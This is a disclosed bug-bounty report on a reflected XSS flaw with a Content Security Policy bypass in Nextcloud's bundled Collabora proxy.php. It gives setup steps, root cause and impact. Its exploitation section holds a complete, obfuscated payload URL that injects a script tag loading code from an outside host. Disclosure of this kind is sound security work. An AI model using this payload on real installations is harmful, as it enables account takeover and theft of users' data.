# Reflected XSS vulnerability with full CSP bypass in Nextcloud installations using recommended bundle

## Report Details
- **Report ID**: 1893186
- **URL**: https://hackerone.com/reports/1893186
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-03-06T13:48:53.293Z
- **Disclosed**: 2023-05-15T06:44:55.846Z

## Reporter
- **Username**: lukasreschke
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
## Summary:

The vulnerability report describes a reflected XSS vulnerability with full CSP bypass in Nextcloud installations using the recommended bundle. The vulnerability can be exploited to perform a trivial account takeover attack.

## Steps To Reproduce:

## Setup Nextcloud
Download the latest Nextcloud release from Docker and run it on port 80:

```
docker run -d -p 80:80 nextcloud:latest
```

Open `http://localhost` in your browser and enter your chosen admin username and password. On the next screen install all recommended apps. The standard "Nextcloud Office" here will result in installing the vulnerable `richdocumentscode` application (see [HubBundle.php](https://github.com/nextcloud/server/blob/eddc6f2103665d985a9e541b16d61fab5ba6a1ee/lib/private/App/AppStore/Bundles/HubBundle.php#L45)):

{F2211280}

## Exploitation

Open the following URL in your (or the victims) browser (the payload needs some extra encoding):

> http://localhost/custom_apps/richdocumentscode/proxy.php?req=/browser/a4b9c74/cool.html?WOPISrc=http://example.com:%3c%69%6d%67%20%73%72%63%3d%27%27%20%6f%6e%65%72%72%6f%72%3d%27%73%3d%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%31%31%35%2c%39%39%2c%31%31%34%2c%31%30%35%2c%31%31%32%2c%31%31%36%29%29%3b%73%2e%73%72%63%3d%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%34%37%2c%20%34%37%2c%20%34%39%2c%20%35%33%2c%20%34%36%2c%20%31%31%34%2c%20%31%31%35%29%3b%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%73%29%27%3e

There is a full CSP bypass as the `proxy.php` from the default shipped "richdocumentscode" is not using a regular Nextcloud controller but plain PHP code:

{F2211288}


## Root cause

1. Collabora Online is generating HTML documents using insecure string concatenation. ([code pointer](https://github.com/CollaboraOnline/online/blob/00b0fd48c949af475f8be0cc5bfd2149805f7905/wsd/FileServer.cpp#L719-L722))
2. The included `proxy.php` inside the "richdocumentscode" is not applying any of the default CSP policies of Nextcloud, as it is running on the same origin this can be used for a trivial account take over attack. ([code pointer](https://github.com/CollaboraOnline/richdocumentscode/blob/3043ad186a9896899ff8d6f3ea83c93c5d487b48/proxy.php))

## Impact

The vulnerability allows attackers to inject malicious code into web pages, which can be executed in the context of the victim's browser session. This means that an attacker can steal sensitive data, such as login credentials or personal information, or perform unauthorized actions on behalf of the victim, such as modifying or deleting data.

In this specific case, the vulnerability allows for a trivial account takeover attack. An attacker can exploit the vulnerability to inject code into the victim's browser session, allowing the attacker to take over the victim's account without their knowledge or consent. This can lead to unauthorized access to sensitive information and data, as well as the ability to perform actions on behalf of the victim.

Furthermore, the fact that the vulnerability bypasses the Content Security Policy (CSP) makes it more dangerous, as CSP is an important security mechanism used to prevent cross-site scripting attacks. By bypassing CSP, attackers can circumvent the security measures put in place by the web application and execute their malicious code.

## Attachments
- Screenshot_2023-03-06_at_14.25.38.png
- Screenshot_2023-03-06_at_14.28.45.png
